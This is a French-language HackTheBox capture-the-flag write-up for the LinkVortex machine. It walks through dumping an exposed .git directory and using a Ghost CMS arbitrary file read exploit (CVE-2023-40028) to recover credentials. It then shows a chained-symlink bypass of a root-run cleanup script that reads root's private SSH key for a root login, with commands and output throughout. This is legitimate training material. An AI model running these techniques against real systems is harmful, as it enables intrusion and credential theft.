---
title: HTB | Linkvortex
description: LinkVortex is an easy-difficulty Linux machine with various ways to leverage symbolic link files (symlinks). The initial foothold involves discovering an exposed `.git` directory that can be dumped to retrieve credentials. These credentials allow access to the Ghost content management system vulnerable to [CVE-2023-40028](https://nvd.nist.gov/vuln/detail/CVE-2023-40028). This vulnerability allows authenticated users to upload symlinks, enabling arbitrary file read within the Ghost container. The exposed credentials in the Ghost configuration file can then be leveraged to gain a shell as the user on the host system. Finally, the user can execute a script with sudo permissions that are vulnerable to a symlink race condition attack (TOCTOU). This presents an opportunity to escalate privileges by creating links to sensitive files on the system and ultimately gaining root access.
slug: linkvortex-htb
date: 2025-10-22 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Linkvortex cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linkvortex</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.47</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users
```bash
# Ghost application
admin@linkvortex.com : OctopiFociPilfer45
# SSH
bob : fibber-talented-worth
```

## Enumeration

### nmap

```bash
$ nmap -sC -sV -An -T4 -vvv -p- 10.10.11.47
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3ef8b968c8eb570fcb0b47b9865083eb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMHm4UQPajtDjitK8Adg02NRYua67JghmS5m3E+yMq2gwZZJQ/3sIDezw2DVl9trh0gUedrzkqAAG1IMi17G/HA=
|   256 a2ea6ee1b6d7e7c58669ceba059e3813 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKLjX3ghPjmmBL2iV1RCQV9QELEU+NF06nbXTqqj4dz
80/tcp open  http    syn-ack ttl 63 Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
```

## Foothold

### linkvortex.htb - Ghost 5.58
On se connecte au port 80 qui nous redirige vers : http://linkvortex.htb
A l'aide **Wappalyzer**, on identifie **Ghost CMS** version 5.58.

### Subdomain Enumeration - dev
> dev.linkvortex.htb
```bash
$ gobuster vhost -u "linkvortex.htb" -w `fzf-wordlists` --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://linkvortex.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /opt/lists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.linkvortex.htb Status: 200 [Size: 2538]

$ cat /etc/hosts     
10.10.11.47 linkvortex.htb dev.linkvortex.htb
```

### .git
On trouve un fichier **.git**, on peut alors récupérer ce dossier git et l'analyser avec **git-dumper**
```bash
$ dirsearch -u http://dev.linkvortex.htb             

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289

Target: http://dev.linkvortex.htb/

[17:09:04] Scanning: 
[17:09:04] 301 -   239B - /.git  ->  http://dev.linkvortex.htb/.git/
...
```

### git-dumper - Password Found

On dump les fichiers du **.git** avec git-dumper :

```bash
$ git-dumper http://dev.linkvortex.htb/.git ./git-dump/
[-] Testing http://dev.linkvortex.htb/.git/HEAD [200]
[-] Testing http://dev.linkvortex.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://dev.linkvortex.htb/.gitignore [404]
[-] http://dev.linkvortex.htb/.gitignore responded with status code 404
...
[-] Fetching http://dev.linkvortex.htb/.git/objects/50/864e0261278525197724b394ed4292414d9fec [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 5596 paths from the index
```

J'ai cloné la véritable version de Ghost 5.58 et j'ai fais un diff avec le dump du .

```bash

$ wget https://github.com/TryGhost/Ghost/archive/refs/tags/v5.58.0.zip
$ unzip v5.58.0.zip
$ diff -r ./Ghost-5.58.0 ./git-dump
Only in ./git-dump: Dockerfile.ghost
diff --color -r ./Ghost-5.58.0/ghost/core/test/regression/api/admin/authentication.test.js ./git-dump/ghost/core/test/regression/api/admin/authentication.test.js
56c56
<             const password = 'thisissupersafe';
---
>             const password = 'OctopiFociPilfer45';
Only in ./git-dump: .git
```
password : `OctopiFociPilfer45`

### Ghost Dashboard
On trouve une page de login permettant d'accéeder au **dashboard** de **Ghost** :
> http://linkvortex.htb/ghost

Intuitivement, on essaye de se connecter avec cette adresse email :
- admin@linkvortex.htb

Credentials :
```bash
admin@linkvortex.htb
OctopiFociPilfer45
```

### Ghost Arbitrary File Read Exploit
Après quelques recherches concernant la version 5.58 de Ghost, on trouve la **CVE-2023-40028** permettant de lire n'importe quel fichier sur la machine de manière arbitraire en utilisant un le compte administrateur.
> https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028

En utilisant la CVE, on tente de lire plusieurs fichiers. Dans **/etc/passwd**, seul l'utilisateur "node" semble avoir un dossier /home, ce qui est étonnant. Ensuite, on trouve le fichier /etc/hosts qui contient :
- 172.20.0.2	484b975c6616

Après vérification, les containers docker on souvent une ip en 172.x.x.x . L'hostname en hexadecimal fait également penser a un container docker.

De plus, on sait que l'application marche avec **Node JS**, et par défaut, les applications node js sont installées dans :
- **/var/lib/[App]**
```bash
$ ./exploit.sh -u admin@linkvortex.htb -p 'OctopiFociPilfer45' -h http://linkvortex.htb
WELCOME TO THE CVE-2023-40028 SHELL
Enter the file path to read (or type 'exit' to quit): /etc/hosts
File content:
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.20.0.2	484b975c6616
```

Par déduction, on tente donc de récupérer le fichier de configuration de l'application ghost :
> /var/lib/ghost/config.production.json

On trouve des credentials semblant permettre l'utilisation d'un serveur mail **SMTP** :
> bob@linkvortex.htb  
> fibber-talented-worth
```bash
Enter the file path to read (or type 'exit' to quit): /var/lib/ghost/config.production.json
File content:
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
...
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
```

### SSH to bob
On peut finalement se connecter en SSH avec le compte utilisateur bob :
```bash
$ ssh bob@10.10.11.47              
bob@10.10.11.47's password: # <<<< fibber-talented-worth
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Dec  3 11:41:50 2024 from 10.10.14.62
-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
bob@linkvortex:~$ cat user.txt 
80f2.....24bb
```

## Privilege Escalation

### Enumeration
```bash
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

### clean_symlink.sh as root
On peut executer ce script en tant que root, en passant fichier avec l'extension ".png" :
`/opt/ghost/clean_symlink.sh` :
```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

1ère essai :
- Creation d'un symlink n00b.png qui pointe vers /root/root.txt
- Execution du script
  - ERROR : "! Trying to read critical files, removing link [ n00b.png ] !"

On remarque que le script utilise **readlink** pour vérifier où pointe notre symlink. S'il pointe vers un fichier dans contenant dans son path "etc" ou "root" il ne le lit pas.

Pour bypasser cette protection, il suffit de créer deux symlink :
- 1er symlink : n00b pointe vers /root/root.txt
- 2ème symlink : exploit.png pointe vers n00b

Lorsqu'il vérifie où pointe le symlink exploit.png il trouve "n00b" et autorise donc sa lecture. Or, comme n00b pointe vers root.txt, le fichier s'affiche dans le terminal :

```bash
bob@linkvortex:/var/quarantined$ ln -s /root/root.txt n00b
bob@linkvortex:/var/quarantined$ ls
n00b
bob@linkvortex:/var/quarantined$ ln -s n00b exploit.png
bob@linkvortex:/var/quarantined$ ls
exploit.png  n00b
bob@linkvortex:/var/quarantined$ ls -lah
total 8.0K
drwxr-xr-x  2 bob  bob  4.0K Oct 22 22:46 .
drwxr-xr-x 14 root root 4.0K Nov 29  2024 ..
lrwxrwxrwx  1 bob  bob     4 Oct 22 22:46 exploit.png -> n00b
lrwxrwxrwx  1 bob  bob    14 Oct 22 22:45 n00b -> /root/root.txt
bob@linkvortex:/var/quarantined$ cat n00b
cat: n00b: Permission denied
bob@linkvortex:/var/quarantined$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh exploit.png
Link found [ exploit.png ] , moving it to quarantine
/usr/bin/mv: 'exploit.png' and '/var/quarantined/exploit.png' are the same file
Content:
5f3e.....aebc9
```

### Root shell
On utilise l'exploit pour lire la clé SSH de l'utilisateur root et se connecter en SSH :

```bash
bob@linkvortex:/var/quarantined$ ln -s /root/.ssh/id_rsa n00b
bob@linkvortex:/var/quarantined$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh exploit.png
Link found [ exploit.png ] , moving it to quarantine
/usr/bin/mv: 'exploit.png' and '/var/quarantined/exploit.png' are the same file
Content:
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmpHVhV11MW7eGt9WeJ23rVuqlWnMpF+FclWYwp4SACcAilZdOF8T
...
xmo6eXMvU90HVbakUoRspYWISr51uVEvIDuNcZUJlseINXimZkrkD40QTMrYJc9slj9wkA
ICLgLxRR4sAx0AAAAPcm9vdEBsaW5rdm9ydGV4AQIDBA==
-----END OPENSSH PRIVATE KEY-----

# -------------------------------

$ vim root.key
$ chmod 600 root.key
$ ssh -i root.key root@10.10.11.47
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)
...

Last login: Mon Dec  2 11:20:43 2024 from 10.10.14.61
-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
root@linkvortex:~# whoami
root
root@linkvortex:~# cat root.txt 
5f3e.....ebc9
```